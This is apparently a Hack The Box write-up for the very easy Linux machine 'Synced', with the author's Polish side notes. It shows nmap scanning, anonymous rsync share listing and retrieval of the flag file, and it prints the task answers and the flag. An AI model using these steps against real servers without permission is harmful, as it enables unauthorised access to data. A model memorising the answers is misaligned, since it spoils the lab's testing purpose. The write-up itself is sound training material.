# Hack The Box - Synced

Difficulty: Very Easy  
OS: Linux  
IP: TARGET.IP  

---

# 0. Task Answers

Task 1: What is the default port for rsync?  
873  

Task 2: How many TCP ports are open on the remote host?  
1  

Task 3: What is the protocol version used by rsync on the remote machine?  
31  

Task 4: What is the most common command name on Linux to interact with rsync?  
rsync  

Task 5: What credentials do you have to pass to rsync in order to use anonymous authentication?  
anonymous:anonymous, anonymous, None, rsync:rsync none  

Task 6: What is the option to only list shares and files on rsync?  
list-only  

Flag:  
72eaf5344ebb84908ae543a719830519  

---

# 1. Reconnaissance

## Nmap scan

Command:

nmap -sC -sV -p- TARGET.IP

Result:

PORT     STATE SERVICE VERSION  

- 873/tcp open  rsync  

Notes:

- Only one TCP port open  
- rsync service exposed  

Moje notatki:

nmap -sC -sV -p- TARGET.IP -> 1 otwarty port TCP  

---

# 2. Enumeration

## Service enumeration

Check rsync shares:

rsync TARGET.IP::

Findings:

- available shares listed  

Moje notatki:

rsync dostępny na porcie 873  

---

## Protocol information

Findings:

- rsync protocol version 31  

Moje notatki:

nmap pokazuje wersje 31  

---

## Authentication

Tested credentials:

- anonymous:anonymous  
- anonymous  
- None  
- rsync:rsync  

Result:

- anonymous access allowed  

Moje notatki:

anonymous:anonymous, anonymous, None, rsync:rsync none  

---

# 3. Exploitation

## Listing shares

Command:

rsync TARGET.IP::

Option:

--list-only  

Moje notatki:

list-only  

---

## File retrieval

Command:

rsync -av rsync://TARGET.IP/public/flag.txt flag.txt  

Moje notatki:

komenda rsync -av rsync://TARGET.IP/public/flag.txt flag.txt  

---

## Read flag

Command:

cat flag.txt  

Result:

72eaf5344ebb84908ae543a719830519  

---

# 4. Privilege Escalation

Not required  

---

# 5. Flags

Flag:

72eaf5344ebb84908ae543a719830519  

---

# 6. Lessons Learned

- rsync can expose sensitive data if misconfigured  
- anonymous access is a critical security issue  
- always enumerate available shares  
- rsync can be used to download files without authentication if misconfigured  

---

# Tools Used

- nmap  
- rsync  

---

# References

- https://man7.org/linux/man-pages/man1/rsync.1.html  
